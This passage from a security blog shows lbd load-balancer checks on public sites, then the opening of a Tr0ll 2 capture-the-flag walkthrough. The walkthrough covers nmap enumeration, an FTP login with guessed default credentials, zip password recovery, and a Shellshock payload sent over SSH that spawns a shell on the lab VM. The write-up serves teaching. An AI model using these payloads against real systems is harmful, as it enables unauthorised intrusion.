<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd hackerone.com
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: FOUND
</span><span class='line'>hackerone.com has address 104.16.100.52
</span><span class='line'>hackerone.com has address 104.16.99.52
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> cloudflare-nginx
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: FOUND
</span><span class='line'>&lt; CF-RAY: 36b32c07c6bf2950-OTP
</span><span class='line'>&gt; CF-RAY: 36b32c0835d7292c-OTP
</span><span class='line'>
</span><span class='line'>hackerone.com does Load-balancing. Found via Methods: DNS HTTP[Diff]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>HTTP load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd cisco.com
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: NOT FOUND
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> Apache
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:13:47, 11:13:47, 11:13:48, 11:13:49, 11:13:50, 11:13:51, 11:13:51, 11:13:52, 11:13:53, 11:13:54, 11:13:54, 11:13:55, 11:13:56, 11:13:57, 11:13:57, 11:13:58, 11:13:59, 11:14:00, 11:14:01, 11:14:01, 11:14:02, 11:14:03, 11:14:04, 11:14:04, 11:14:05, 11:14:06, 11:14:07, 11:14:07, 11:14:08, 11:14:09, 11:14:10, 11:14:11, 11:14:11, 11:14:12, 11:14:13, 11:14:14, 11:14:14, 11:14:15, 11:14:16, 11:14:17, 11:14:17, 11:14:18, 11:14:19, 11:14:20, 11:14:21, 11:14:21, 11:14:22, 11:14:23, 11:14:24, 11:14:24, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: FOUND
</span><span class='line'>&gt; Cache-Control: max-age=0
</span><span class='line'>&gt; Expires: Wed, 07 Jun 2017 11:14:27 GMT
</span><span class='line'>
</span><span class='line'>cisco.com does Load-balancing. Found via Methods: HTTP[Diff]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>no load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd nmap.org
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: NOT FOUND
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> Apache/2.4.6 (CentOS)
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:17:00, 11:17:00, 11:17:01, 11:17:01, 11:17:02, 11:17:02, 11:17:03, 11:17:03, 11:17:03, 11:17:04, 11:17:04, 11:17:05, 11:17:05, 11:17:06, 11:17:06, 11:17:07, 11:17:07, 11:17:07, 11:17:08, 11:17:08, 11:17:09, 11:17:09, 11:17:10, 11:17:10, 11:17:10, 11:17:11, 11:17:11, 11:17:12, 11:17:12, 11:17:13, 11:17:13, 11:17:14, 11:17:14, 11:17:14, 11:17:15, 11:17:15, 11:17:16, 11:17:16, 11:17:17, 11:17:17, 11:17:17, 11:17:18, 11:17:18, 11:17:19, 11:17:19, 11:17:20, 11:17:20, 11:17:20, 11:17:21, 11:17:21, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: NOT FOUND
</span><span class='line'>
</span><span class='line'>nmap.org does NOT use Load-balancing.</span></code></pre></td></tr></table></div></figure>


<h3>Key takeaways</h3>

<ul>
<li>when testing load balanced systems, you can try accessing them by IP instead of name (be advised that firewalls might pick up on this as suspicious activity)</li>
</ul>


<p>To learn more about load balancing and pentesting, check out this <a href="https://www.sans.org/reading-room/whitepapers/testing/identifying-load-balancers-penetration-testing-33313">SANS paper</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Q: What is printed on the bottom of \
</span><span class='line'>| beer bottles in Minnesota? A: Open  |
</span><span class='line'>\ other end.                          /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
    <updated>2017-06-06T08:58:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>

<!-- more -->


<p>First, a bit of enumeration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Currently scanning: Finished!   |   Screen View: Unique Hosts                 
</span><span class='line'>                                                                               
</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor   </span></code></pre></td></tr></table></div></figure>


<p>The IP we want is 192.168.217.129.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- -sV -T4 192.168.217.129
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-30 10:27 EDT
</span><span class='line'>Nmap scan report for 192.168.217.129
</span><span class='line'>Host is up (0.000088s latency).
</span><span class='line'>Not shown: 65532 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp     vsftpd 2.0.8 or later
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:CB:3D:2E (VMware)
</span><span class='line'>Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>You know the drill! Something awaits us on that web server!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll2/troll.png" title="troll" alt="troll"></p>

<p>And a comment in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--Nothing here, Try Harder!&gt;</span>
</span><span class='line'><span class="c">&lt;!--Author: Tr0ll&gt;</span>
</span><span class='line'><span class="c">&lt;!--Editor: VIM&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>User-agent:*
</span><span class='line'>Disallow:
</span><span class='line'>/noob
</span><span class='line'>/nope
</span><span class='line'>/try_harder
</span><span class='line'>/keep_trying
</span><span class='line'>/isnt_this_annoying
</span><span class='line'>/nothing_here
</span><span class='line'>/404
</span><span class='line'>/LOL_at_the_last_one
</span><span class='line'>/trolling_is_fun
</span><span class='line'>/zomg_is_this_it
</span><span class='line'>/you_found_me
</span><span class='line'>/I_know_this_sucks
</span><span class='line'>/You_could_give_up
</span><span class='line'>/dont_bother
</span><span class='line'>/will_it_ever_end
</span><span class='line'>/I_hope_you_scripted_this
</span><span class='line'>/ok_this_is_it
</span><span class='line'>/stop_whining
</span><span class='line'>/why_are_you_still_looking
</span><span class='line'>/just_quit
</span><span class='line'>/seriously_stop
</span></code></pre></td></tr></table></div></figure>


<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll2/noob.png" title="noob" alt="noob"></p>

<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ftp 192.168.217.129
</span><span class='line'>Connected to 192.168.217.129.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
</span><span class='line'>Name (192.168.217.129:root): Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; get lmao.zip
</span><span class='line'>local: lmao.zip remote: lmao.zip
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs (8.4682 MB/s)
</span></code></pre></td></tr></table></div></figure>


<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>

<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ls -l
</span><span class='line'>total 68
</span><span class='line'>-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
</span></code></pre></td></tr></table></div></figure>


<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Look Deep within y0ur_self for the answer
</span></code></pre></td></tr></table></div></figure>


<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -l answer.txt
</span><span class='line'>99157 answer.txt
</span></code></pre></td></tr></table></div></figure>


<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>grep -r &quot;_&quot; decoded.txt
</span><span class='line'>noooob_lol
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -L decoded.txt
</span><span class='line'>30 decoded.txt
</span></code></pre></td></tr></table></div></figure>


<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">argparse</span>
</span><span class='line'>
</span><span class='line'><span class="n">desc</span> <span class="o">=</span> <span class="s">&quot;Find and print lines from a file that are a certain length&quot;</span>
</span><span class='line'><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="n">desc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># length argument</span>
</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span><span class='line'>    <span class="s">&#39;-l&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Length value&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;length&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">int</span><span class="p">,</span>
</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># file add_argument</span>
</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span><span class='line'>    <span class="s">&#39;-f&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Filename&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;filename&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">str</span><span class="p">,</span>
</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">filename</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span><span class='line'>      <span class="c"># strip the newline character for accurate counting</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">))</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">length</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="n">line</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ran it and BOOM:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">line_length</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">l</span> <span class="mi">30</span> <span class="o">-</span><span class="n">f</span> <span class="n">decoded</span><span class="o">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">ItCantReallyBeThisEasyRightLOL</span>
</span></code></pre></td></tr></table></div></figure>


<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">unzip</span> <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
</span><span class='line'><span class="n">Archive</span><span class="p">:</span>  <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
</span><span class='line'><span class="p">[</span><span class="n">lmao</span><span class="o">.</span><span class="n">zip</span><span class="p">]</span> <span class="n">noob</span> <span class="n">password</span><span class="p">:</span>
</span><span class='line'>  <span class="n">inflating</span><span class="p">:</span> <span class="n">noob</span>
</span></code></pre></td></tr></table></div></figure>


<p>It looks like it&rsquo;s a private key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">file</span> <span class="n">noob</span>
</span><span class='line'><span class="n">noob</span><span class="p">:</span> <span class="n">PEM</span> <span class="n">RSA</span> <span class="n">private</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>


<p>I tried SSH&#8217;ing as noob this time:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span>
</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>

<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; pwd&quot;</span>
</span><span class='line'><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">noob</span>
</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; /bin/bash&quot;</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
</span><span class='line'><span class="n">Linux</span> <span class="n">Tr0ll2</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">29</span><span class="o">-</span><span class="n">generic</span><span class="o">-</span><span class="n">pae</span> <span class="c">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>

<h3>Shellshock explained</h3>

<p>Because Bash is a scripting language, you can do things like defining functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">myfunction</span><span class="p">()</span> <span class="p">{</span> <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span><span class="p">;</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then you call it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">myfunction</span>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="o">-</span><span class="n">f</span> <span class="n">myfunction</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">env</span>
</span><span class='line'><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</span><span class='line'><span class="n">myfunction</span><span class="o">=</span><span class="p">()</span> <span class="p">{</span>  <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">myfunction</span>
